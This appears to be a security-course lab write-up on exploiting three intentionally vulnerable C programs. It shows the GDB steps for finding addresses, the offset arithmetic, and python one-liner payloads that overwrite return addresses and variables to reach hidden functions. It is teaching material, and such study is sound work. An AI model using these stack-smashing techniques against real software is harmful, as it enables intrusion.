
### Lab 1 - BOF1, BOF2, and BOF3

---

#### **1. bof1.c**

##### *Setting up the run file:*
- Compile the file with the following command:
  ```bash
  $ gcc -g -o bof1.out bof1.c -mpreferred-stack-boundary=2 -fno-stack-protector
  ```

##### *Opening GDB and finding the address of `secretFunc()`:*
- Launch the binary in GDB:
  ```bash
  $ gdb bof1.out
  ```
- Disassemble `secretFunc()` to find its hexadecimal address:
  ```bash
  gdb-peda$ disas secretFunc
  ```
  - Example output:
    ```
    Dump of assembler code for function secretFunc:
    0x0804846b <+0>:     push   ebp
    0x0804846c <+1>:     mov    ebp,esp
    0x0804846e <+3>:     push   0x8048560
    0x08048473 <+8>:     call   0x8048320 <printf@plt>
    0x08048478 <+13>:    add    esp,0x4
    0x0804847b <+16>:    nop
    0x0804847c <+17>:    leave
    0x0804847d <+18>:    ret
    End of assembler dump.
    ```
  - The address of `secretFunc()` is `0x0804846b`.

##### *Calculating the buffer offset:*
- Find the distance between the buffer (`&array[0]`) and the return address (`$ebp+4`):
  ```bash
  gdb-peda$ p $ebp+4-&array[0]
  ```
  - Example output:
    ```
    $2 = 0xcc   # cc in HEX = 204 in DEC
    ```

##### *Exploiting the buffer overflow:*
- Run the program with a payload of 204 placeholder characters followed by the hexadecimal address of `secretFunc()`:
  ```bash
  $ python -c "print 'a'*204 + '\x6b\x84\x04\x08'" | ./bof1.out
  ```
- Expected output:
  ```
  Enter text: Congratulation!
  Segmentation fault
  ```

---

#### **2. bof2.c**

##### *Setting up the run file:*
- Compile the file with the following command:
  ```bash
  $ gcc -g -o bof2.out bof2.c -mpreferred-stack-boundary=2 -fno-stack-protector
  ```

##### *Opening GDB and finding addresses:*
- Launch the binary in GDB:
  ```bash
  $ gdb bof2.out
  ```
- Set a breakpoint at `main` and run the program:
  ```bash
  gdb-peda$ break main
  gdb-peda$ run
  ```

##### *Inspecting the addresses of `check` and `buf`:*
- Find the addresses of the `check` variable and `buf` array:
  ```bash
  gdb-peda$ x &check
  ```
  - Example output: `0xffffd734`
  
  ```bash
  gdb-peda$ x &buf
  ```
  - Example output: `0xffffd70c`

##### *Calculating buffer overflow distance:*
- The distance between `check` and `buf` is `0xffffd734 - 0xffffd70c = 0x28 = 40` bytes.

##### *Exploiting the buffer overflow:*
- Run the program with a payload of 40 placeholder characters followed by the address `0xdeadbeef` to overwrite the `check` variable:
  ```bash
  $ python -c "print 'a'*40 + '\xef\xbe\xad\xde'" | ./bof2.out
  ```
- Expected output:
  ```
  [buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ
  [check]: 0xdeadbeef
  Yeah! You win!
  ```

---

#### **3. bof3.c**

##### *Setting up the run file:*
- Compile the file with the following command:
  ```bash
  $ gcc -g -o bof3.out bof3.c -mpreferred-stack-boundary=2 -fno-stack-protector
  ```

##### *Opening GDB and finding the address of `shell()`:*
- Launch the binary in GDB:
  ```bash
  $ gdb bof3.out
  ```
- Disassemble the `shell()` function to find its hexadecimal address:
  ```bash
  gdb-peda$ disas shell
  ```
  - Example output:
    ```
    Dump of assembler code for function shell:
    0x0804845b <+0>:     push   ebp
    0x0804845c <+1>:     mov    ebp,esp
    0x0804845e <+3>:     push   0x8048540
    0x08048463 <+8>:     call   0x8048330 <puts@plt>
    0x08048468 <+13>:    add    esp,0x4
    0x0804846b <+16>:    nop
    0x0804846c <+17>:    leave
    0x0804846d <+18>:    ret
    End of assembler dump.
    ```
  - The address of `shell()` is `0x0804845b`.

##### *Inspecting the addresses of `func` and `buf`:*
- Find the addresses of `func` and `buf`:
  ```bash
  gdb-peda$ x &func
  ```
  - Example output: `0xffffd734`
  
  ```bash
  gdb-peda$ x &buf
  ```
  - Example output: `0xffffd6b4`

##### *Calculating buffer overflow distance:*
- The distance between `func` and `buf` is `128` bytes.

##### *Exploiting the buffer overflow:*
- Run the program with a payload of 128 placeholder characters followed by the address of `shell()`:
  ```bash
  $ python -c "print 'a'*128 + '\x5b\x84\x04\x08'" | ./bof3.out
  ```
- Expected output:
  ```
  You made it! The shell() function is executed
  ```